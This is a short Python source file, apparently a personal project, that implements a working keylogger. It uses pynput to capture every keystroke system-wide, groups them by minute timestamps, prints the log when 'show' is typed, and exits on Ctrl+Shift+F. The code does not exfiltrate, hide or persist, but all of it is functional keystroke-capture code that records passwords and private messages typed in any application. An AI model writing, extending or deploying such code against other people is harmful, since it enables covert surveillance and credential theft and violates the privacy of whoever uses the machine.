import os
from pynput import keyboard
import datetime

key_log = {}

def time_taker():
    now = datetime.datetime.now()
    return now.strftime("%H:%M--%d/%m/%Y")


def key_pressed(key):
    # writes the key to the file
    # parameter: key: the key to write
    # returns: None
    now=time_taker()
    try:
        char=key.char
        #print(now)
        #logkey.write(char,now)
        #logkey.write(char+now)
    except AttributeError:
        char = str(key).split('.')[1]
        if char == 'space':
            char = ' '
        if char == 'enter':
            char = '\n'
    if now in key_log:
        key_log[now].append(char)
    else:
        key_log[now] = [char]


def kill_the_process():
    """when <ctrl>+<shift>+f pressed the func kill the process"""
    os._exit(0)

def print_dict():
    for key in key_log:
        print(f' ***** {key} ***** ')
        print(''.join(key_log[key]))
        print()


def main():
    listener=keyboard.Listener(on_press=key_pressed)
    listener.start()
    keyboard.GlobalHotKeys({'<ctrl>+<shift>+f': kill_the_process}).start()
    while True:
        user_input = input('')
        if user_input == 'show':
            print_dict()


if __name__=="__main__":
   main()